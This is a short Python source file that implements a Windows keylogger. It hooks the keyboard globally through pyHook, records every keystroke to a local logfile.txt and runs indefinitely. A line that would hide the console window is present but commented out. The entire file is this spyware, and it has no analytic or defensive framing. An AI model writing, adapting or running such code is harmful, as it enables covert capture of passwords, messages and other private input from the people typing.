import win32api 
import win32console
import win32gui 
import pythoncom, pyHook 
import os
def keylogg(): 
    if not os.path.exists("logfile.txt"):
        with open("logfile.txt", "w"):
            pass
    win = win32console.GetConsoleWindow() 
    #win32gui.ShowWindow(win, 0) 
    
    def OnKeyboardEvent(event):
        c_num = event.Ascii
        c = chr(event.Ascii)
        with open("logfile.txt", "a") as f:
            if c_num == 13:
                f.write("\n")
            f.write(c)
        return True
    # create a hook manager object 
    hm = pyHook.HookManager() 
    hm.KeyDown = OnKeyboardEvent 
    # set the hook 
    hm.HookKeyboard() 
    # wait forever 
    pythoncom.PumpMessages()
    